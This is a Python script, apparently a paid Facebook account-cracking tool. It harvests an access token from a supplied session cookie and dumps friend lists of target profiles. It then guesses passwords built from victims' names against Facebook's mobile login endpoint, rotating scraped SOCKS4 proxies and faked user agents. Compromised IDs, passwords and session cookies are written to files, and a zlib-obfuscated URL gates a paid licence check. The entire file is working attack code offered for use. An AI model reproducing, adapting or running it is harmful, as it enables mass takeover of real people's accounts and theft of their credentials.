#!/usr/bin/python3
# -*- coding: utf-8 -*-
from time import sleep
import time
import webbrowser
import requests,bs4,zlib,json,os,subprocess,sys,random,datetime,time,re,urllib3
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as karma
from platform import platform
import base64
id=[]
id2=[]
loop=0
ok=0
cp=0
akun=[]
oprek=[]
method=[]
taplikasi=[]
tokenku=[]
uid=[]
lisensikuni=[]
cokbrut=[]
pwpluss=[]
pwnya=[]
princp=[]
ugen=[]
ugen2=[]
lisensiku=[]
ses=requests.Session()
try:os.mkdir('/sdcard/KHAN-DATA/TAP-A2F')
except:pass
try:os.mkdir('/sdcard/KHAN-DATA/OK')
except:pass
try:os.mkdir('/sdcard/KHAN-DATA/CP')
except:pass
try:os.mkdir('/sdcard/KHAN-DATA/DUMP')
except:pass
try:os.mkdir('/sdcard/KHAN-DATA/Results')
except:pass
#---- PROGRES ------
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn	 
# COLORS
CY='\033[96;1m' #CYAN
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
KARMAA ='KARMABOSS'
Z = '\033[1;31m '
X =  '\033[1;33m '
M = '\x1b[1;91m'
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;39m' 
H = '\x1b[1;92m'
C = '\033[2;35m' 
B = '\033[2;36m'
Y = '\033[1;34m'
pess = input(B + ' ENTER PURCHASE CODE: ')
if pess == KARMAA:
    print(H+ ' CODE ACTIVE✓✓ ')
    time.sleep(1)
    os.system('clear')
else:
    exit(M + ' WRONG CODE MF')
# Converter Bulan
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('FAILED TO GET PROXY DATAFAILED TO GET PROXY DATA')
    exit()
prox=open('.prox.txt','r').read().splitlines()
#os.system('rm -rf .prox.txt')
for jiah in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['10','11','12'])
    c='SM-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(678, 9999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.532'
    #g='AppleWebKit/534.31 (KHTML, like Gecko) UCBrowser/9.3.1.344 U3/0.8.0 Mobile Safari/534.31'
    h=random.randrange(90,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Puffin/9.2.2.50590AP'
    uaku2=f'{aa} {b}; en-US; {c}{d}{e}{f}) {g}'
    ugen.append(uaku2)
for bb in range(10000):
    a='BlackBerry'
    b=random.randrange(4000, 9999)
    c=random.randrange(1,6)
    d=random.choice(['0','1','2','3','4','5','6'])
    e='0'
    f=random.randrange(100, 999)
    g='Profile/MIDP-'
    h='2'
    i=random.choice(['0','1'])
    j='Configuration/CLDC-1.1'
    k='VendorID/'
    l=random.randrange(100, 999)
    ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}[FBAN/EMA;FBLC/pt_BR;FBAV/294.0.0.12.118;]'
    ugen2.append(ua)
# CLEAR
def clear():
        os.system('clear')
# BACK
def back():
        login()
#LOGO
def banner():
        clear()
        print("""%s
##    ##    ###    ########  ##     ##    ###    
##   ##    ## ##   ##     ## ###   ###   ## ##   
##  ##    ##   ##  ##     ## #### ####  ##   ##  
#####    ##     ## ########  ## ### ## ##     ## 
##  ##   ######### ##   ##   ##     ## ######### 
##   ##  ##     ## ##    ##  ##     ## ##     ## 
##    ## ##     ## ##     ## ##     ## ##     ## 

 ╔══════════════════════════════════════════╗
 AUTHOR   {H}• Karma David
 GITHUB   {H}• https://github.com/Karma-Kh3n
 FB       {H}+ https://me.fb/Karma428
 ╚══════════════════════════════════════════╝
"""%(P))

def linex():
        print('\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m')
        
#LOGIN        
def login():
        keyx()
        try:
                token = open('.token.txt','r').read()
                cok= open('.cok.txt','r').read()
                tokenku.append(token)
                try:
                        sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0], cookies = {"cookie":cok})
                        my_name = json.loads(sy.text)['name']
                        my_id = json.loads(sy.text)['id']
                        menu(my_name,my_id)
                except KeyError:
                        login_lagi334()
                except requests.exceptions.ConnectionError:
                        banner()
                        print(' %s NETWORK ERROR ! '%(M))
                        exit()
        except IOError:
                login_lagi334()

# LOGIN
def login_lagi334():
        banner()
        try:
                cookie=input("%s [➣] ENTER COOKIE: %s"%(P,P))
                
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
                find_token = re.search("(EAAG\w+)", data.text)
                ken=open(".token.txt", "w").write(find_token.group(1))
                cok=open(".cok.txt", "w").write(cookie)
                print('LOGGED IN✓✓✓');time.sleep(1)
                print("\n run : python crack.py")
                os.system('xdg-open https://github.com/Karma-kh3n')
                exit()
        except Exception as e:
                os.system("rm -f .cok.txt")
                print('%s COOKIE ERROR '%(M))
                exit()


#MENU
def menu(my_name,my_id):
        try:sh = requests.get('https://httpbin.org/ip').json()
        except:sh = {'origin':'-'}
        banner()
        linex()
        print('%s[%s➣%s] %sSTATUS %s        : %sPAID'%(P,P,P,P,P,H))
        print('%s[➣] NAME           : %s'%(H,my_name.upper()))
        print('%s[➣] FACEBOOK ID    : %s'%(H,my_id))
        print('%s[➣] IP ADDRESS     : %s'%(H,str(sh['origin'])))
        linex()
        print('%s[%s01%s] %sPUBLIC ID'%(H,H,H,H));time.sleep(0.02)
        print('%s[%s02%s] %sBULK CRACK %sCRACK'%(P,P,P,P,P));time.sleep(0.02)
        print('%s[%s03%s] %sFILE %sCLONE'%(P,P,P,P,P));time.sleep(0.01)
        print('%s[%s04%s] %sDUMP %sFILE'%(P,P,P,P,P));time.sleep(0.01)
        print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
        jh = input(P+'['+P+'➣'+P+']  KARMA:  ')
        if jh in ['1','01']:
                dump_publik()
        elif jh in ['2','02']:
                multidump()
        elif jh in ['3','03']:
                arc()
        elif jh in ['4','04']:
                mixdump()                 
        elif jh in ['6','00']:
                os.system("rm -f .cok.txt")
                print(h+'  ['+h+'+'+h+']  HOLD ')
                time.sleep(1)
                print('# EXIT SUCCESSFULLY')
                exit()
        else:
                print('# RETURN BACK TO MENU')
                exit()
                
def mixdump():
    os.system("clear")
    keyx()
    try:
        token = open(".token.txt", "r").read()
        cookie = {'cookie':open('.cok.txt', 'r').read()}
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cok.txt')
        login()
    os.system('clear')
    banner()
    try:
        limit = int(input('IDS LIMIT '))
    except:
        limit = 50
    t = 0
    for t in range(limit):
        t +=1
        ids = input('PUT ID %s: '%(t))
        try:
            ys = open('ids.txt', 'a')
            url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ids,token))
            with requests.Session() as xyz:
                jso = json.loads(xyz.get(url,cookies=cookie).text)
                for d in jso["friends"]["data"]:
                    id.append(d['id'] + '|' + d['name'])
                    ys.write(d['id'] + '|' + d['name'] + '\n')

                ys.close()
                print('Sucesful id extract')
        except KeyError:
            print('\r\033[1;97mCookies invalid')
            time.sleep(1)
            pass
    save_file = input('FILENAME SAVED TO ')
    os.system('mv ids.txt /sdcard/'+save_file)
    print('SAVED IDS FILE PATH: /sdcard/'+save_file)
    print(50*'-')
    input('Press enter to back')
    print("\n run : python crack.py")
    exit()


def arc():
        filelist = input('\033[1;97m[++] INPUT FILE ')
        keyx()
        try:
                for line in open(filelist, 'r').readlines():
                        id.append(line.strip())
                print(P+'['+P+'++'+P+'] TOTAL : '+str(len(id)))
                setting()
        except:
                print('\n %s[%s×%s] FILE [%s%s%s] NOT FUND FIRST DUMP CHECK 1 TO 4 OPTIONS'%(P,P,P,P,filelist,N));time.sleep(1)
 
 
# PUBLIC CRACK
def dump_publik():
        keyx()
        try:
                cok= open('.cok.txt','r').read()
        except IOError:
                exit()
        linex()
        print
        pil = input(P+'['+P+'➣'+P+'] ENTER ID: ')
        try:
                koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
                for pi in koh2['friends']['data']:
                        try:id.append(pi['id']+'|'+pi['name'])
                        except:continue
                print(P+'['+P+'+'+P+'] TOTAL: '+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
                print('# BAD INTERNET CONNECTION')
                exit()
        except (KeyError,IOError):
                print('# WRONG ID NUMBER')
                exit()

def multidump():
        keyx()
        try:
                cok= open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                linex()
                nanya_keun = int(input('%s[%s+%s] ENTER LIMIT %s:%s '%(P,P,P,P,P)))
        except:nanya_keun=1000000
        for mnh in range(nanya_keun):
                mnh +=1
                print()
                pil = input('[%s+%s] ENTER PUBLIC ID: %s%s%s : '%(P,P,P,mnh,P))
                try:
                        koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
                        for pi in koh2['friends']['data']:
                                try:id.append(pi['id']+'|'+pi['name'])
                                except:continue
                except requests.exceptions.ConnectionError:
                        print('[×] BAD INTERNET CONNECTION! ')
                except (KeyError,IOError):
                        print('\n [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUND');multidump()
        print()
        print(P+'['+P+'➣'+P+'] TOTAL : '+str(len(id)))
        setting()
        


def setting():
    print('\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m')
    print('%s[%s01%s] %sDEMON [RECOMMENDED ✓✓]'%(H,H,H,H));time.sleep(0.03)
    print('%s[%s02%s] %sDHARMA CRACK %s[✓]'%(N,M,N,M,N));time.sleep(0.03)
    print('\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m\x1b[0;0m-\x1b[0;0m')
    hu = input(P+'['+P+'➣'+P+'] CHOOSE: ')
    if hu in ['1','01']:
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['2','02']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print("\n INVALID")
        exit()
    
    
        
        pwpluss.append('no')
    passwrd()
def passwrd():
    print("\033[91;1m BRO CLONING HAVE START PLS WAIT...\x1b[0m")
    print("\033[91;1m WE ARE ANONYMOUS. WE ARE LEGION. WE DO NOT FORGIVE.")
    print("\033[91;1m WE DO NOT FORGET.\033[91;1m√\033[93;1m√\x1b[0m")
    
    global prog,des
    prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with karma(max_workers=30) as bool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = [nmf]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(frs+'123')
                else:
                    pwv.append(frs+'123')
#                   pwv.append('sayangku')
#                   pwv.append('sayang')
                if 'free' in method:
                    bool.submit(crack,idf,pwv,nmf)
                else:
                    bool.submit(crack,idf,pwv,nmf)
    print("\n CRACKING COMPLETED")
    exit()
# CRACKER
def crack(idf,pwv,nmf):
    global loop,ok
    bi = random.choice([H])
    pers = loop*100/len(id2)
    fff = '%'
    ua2 = random.choice(ugen2)
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    ses=requests.Session()
    prog.update(des,description=f"{loop}/{len(id2)} OK-:[bold green]{ok}[/]")
    prog.advance(des)
    for pw in pwv:
        try:			
            ua = random.choice(ugen)
            #seua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
            head1={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
'cache-control': 'max-age=0',
'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Blackberry"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': ua}
            p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',headers=head1)
            readable = str(time.time()).split('.')[0]
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"next=https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass": pw}
            head2={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
'x-requested-with': 'mark.via.gp',
'cache-control': 'max-age=0',
'content-length': '159',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://free.facebook.com',
'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&errorcode=1348092&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': ua}
            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,headers=head2,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    cp+=1
                    idfs=idf
                    pws=pw
 #                   cekopsii(idfs,pws)
                    break
                elif 'ya' in princp:
                    cp+=1
                    print('\n')
                    #statuscp = f'\r{K}\n[•] CP     : {idf}\n[•] PASSWORD : {pw} {C}\n'
                    #print(statuscp)
                    open('/sdcard/KHAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')

                else:
                    #statuscp = f'\r{K}\n[•] CP     : {idf}\n[•] PASSWORD : {pw} {C}\n'
                    #print(statuscp)
                    open('/sdcard/KHAN-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                break
            elif "c_user" in po.cookies.get_dict().keys():
                ok+=1
                headapp={"user-agent":"Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.2.3.4) Gecko UCBrowser/"}
                #if 'no' in taplikasi:
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
#                    open('/sdcard/KHAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                print('%s[%s+%s] %s%s%sGOOD'%(H,H,H,H,H,H))
                statusok = f'\r{H}\n[+] KARMA  : {idf}\n[+] PASSWORD : {pw}\n[+] COOKIES  : {kuki}'
                print(statusok)
                linex()
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    
def cek_opsi():
    c = len(akun)
    hu = '  [C] Terdapat %s Akun Untuk Dicek\n  [C]Sebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    print(hu)
    input(x+'['+h+'•'+x+'] Mulai')
    welcome=f'''╔════════════════════════════════════════════════════════════╗
║                   OPTION CHECK PROCESS START                  ║
╚════════════════════════════════════════════════════════════╝'''                   
    print(welcome)
    love = 1
    for kes in akun:
            idfs,pws= kes.split('|')[0],kes.split('|')[1]
            print('\r[P] PROCESSING ID [ %s ] [ %s/%s]'%(idfs,love,len(akun)));sys.stdout.flush()
            cekopsii(idfs,pws)
            love+=1
    welcome=f'''╔════════════════════════════════════════════════════════════╗
║                             {P}COMPLETED{P}                           ║
╚════════════════════════════════════════════════════════════╝'''                   
    print(welcome)
    exit()

#ERROR BYPASSING
def genkey():
        try:
                basex = open('/sdcard/Android/media/.libr-cpq', 'r').read()
                basex1 = basex.encode('ascii')
                basex2 = base64.b64encode(basex1)
                basex3 = basex2.decode('ascii')
                base4 = (basex3).upper()
                nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
                clear()
                banner()
                linex()
                print ('\x1b[1;97m\tYOUR ID IS NOT YET APPROVED\n')
                print('\r         TOOL PRICE 25K | 2 WEEKS\n')
                linex()
                print("\x1b[37;1m     YOUR ID :\033[1;91m%s"%(nr))
                print("\033[1;97m     OWNER   :\033[1;92mKARMA DAVID")
                linex()
                
                subprocess.check_output(["am", "start", "https://wa.me/+2348110044418?text=Hi+Karma+i+Want+to+pay+for+Crack+linces:+++"])
                exit()
        except(IOError):
                basex = str(random.randint(1,9999999))
                open("/sdcard/Android/media/.libr-cpq","w").write(basex)
                os.system("chmod 777 /sdcard/Android/media/.libr-cpq")
                genkey()

#ERROR BYPASSING
def keyx():
        os.system("touch /sdcard/.key")
        os.system("rm -rf /sdcard/.key")
        try:
                basex = open("/sdcard/Android/media/.libr-cpq","r").read()
        except(KeyError, IOError):
                genkey()
        try:
                zl = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J\xcd+)\xaa\xd4K\xce\xd77/\xca,3\x05\x00gA\x08\\')
                rq = requests.get(zl).text
        except requests.exceptions.ConnectionError:
                print('%sBAD INTERNET CONNECTION'%(P))
                exit()
        basex1 = basex.encode('ascii')
        basex2 = base64.b64encode(basex1)
        basex3 = basex2.decode('ascii')
        base4 = (basex3).upper()
        nr = base4.replace('=', 'N').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', 'R').replace("5","X").replace("1","X")
        if nr in rq:
                pass
        else:
                genkey()


def tipsx():
    print('NEXT UPDATE')
def cekopsii(id,pw):
    print(id+pw)
if __name__=='__main__':
    login()
